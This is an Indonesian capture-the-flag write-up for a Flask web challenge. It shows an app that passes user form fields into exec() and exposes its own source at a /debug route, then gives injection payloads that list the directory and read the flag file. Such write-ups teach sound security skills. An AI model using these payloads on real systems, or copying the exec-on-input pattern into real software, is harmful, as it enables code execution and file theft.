# Kucing meong meong (50 Points)
http://ctf.serangkota.go.id:9972/
# Solved
<b>Notice! Write-up ini bersifat spoiler, jika kalian sudah lelah menemukan dimana letah celahnya disarankan membaca write-up. akan tetapi jika belum berusaha sama sekali diharapkan di coba-coba dulu :D</b><br>
CTRL + U pada website
```html
<!DOCTYPE html>
<head>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <meta name='author' content='makelaris'>
    <title>@jack&door</title>
    <link rel='stylesheet' href='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' integrity='sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T' crossorigin='anonymous'>
    <link href='//fonts.googleapis.com/css?family=Comfortaa' rel='stylesheet' type='text/css'>
    <style>html, body {background-image: url('https://i.pinimg.com/originals/e8/79/73/e8797388136d93a8f102c61ccb758c45.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>
</head>
<body> 
	<img class='mx-auto d-block img-responsive' src='https://i.pinimg.com/originals/e8/0a/30/e80a305f17d0738341db0553a00c51d1.gif'>
	
	<h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'>62</h1>
	
</body>
<!-- /debug -->
</html>
```
Kita menemukan angka acak dan ada salah satu komentar yaitu <b>/debug</b> yang mungkin menunjukkan untuk ke file debug mungkin :/, mari kita buka!<br>
Setelah kita akses kita mendapatkan source code dari website tersebut
```python
from flask import Flask, Response, request, render_template, request
from random import choice, randint
from string import lowercase
from functools import wraps

app = Flask(__name__)

def calc(recipe):
	global garasi
	garasi = {}
	try: exec(recipe, garasi)
	except: pass

def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
	@wraps(func)
	def organisasi(*args, **kwargs):
		bahan = ''.join(choice(lowercase) for _ in range(10))
		recipe = '%s = %s' % (bahan, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))

		if request.method == 'POST':
			bahan = request.form.get('bahan', '')
			recipe = '%s = %s' % (bahan, request.form.get('meteran', ''))

		calc(recipe)

		if garasi.get(bahan, ''):
			return render_template('index.html', calculations=garasi[bahan])

		return func(*args, **kwargs)
	return organisasi

@app.route('/', methods=['GET', 'POST'])
@GCR
def index():
	return render_template('index.html')

@app.route('/debug')
def debug():
	return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
	app.run('0.0.0.0', port=5001)
```
Kita bisa lihat disini, ada code yang bernama <b>exec</b> yang mengijinkan kita untuk mengeksekusi script python kita sendiri melalui
```python
request.form.get('bahan','')
request.form.get('meteran', '')
```
Oke mari kita exploit!, ini adalah exploit yang saya gunakan untuk mendapatkan semua file yang berada di directory tersebut
```
bahan=a
meteran=[1]; import os; a.append([x for x in os.listdir("./")])
```
Hasil :
```html
<!DOCTYPE html>
<head>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <meta name='author' content='makelaris'>
    <title>@jack&door</title>
    <link rel='stylesheet' href='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' integrity='sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T' crossorigin='anonymous'>
    <link href='//fonts.googleapis.com/css?family=Comfortaa' rel='stylesheet' type='text/css'>
    <style>html, body {background-image: url('https://i.pinimg.com/originals/e8/79/73/e8797388136d93a8f102c61ccb758c45.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>
</head>
<body>
    <img class='mx-auto d-block img-responsive' src='https://i.pinimg.com/originals/e8/0a/30/e80a305f17d0738341db0553a00c51d1.gif'>
    <h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'>[1, [&#39;requirements.txt&#39;, &#39;templates&#39;, &#39;aplikasi.py&#39;, &#39;flag&#39;]]</h1>
</body>
<!-- /debug -->
</html>
```
Kita bisa lihat bahwasannya ada file yang bernama <b>flag</b>, mari kita coba baca file tersebut menggunakan script ini
```
[1]; f = open("flag", "r"); a.append(f.read())
```
Boom! Flag muncul :D :v<br>
Flag : <b>DiskoCTF{my_F1rst_flask_4pp}</b>
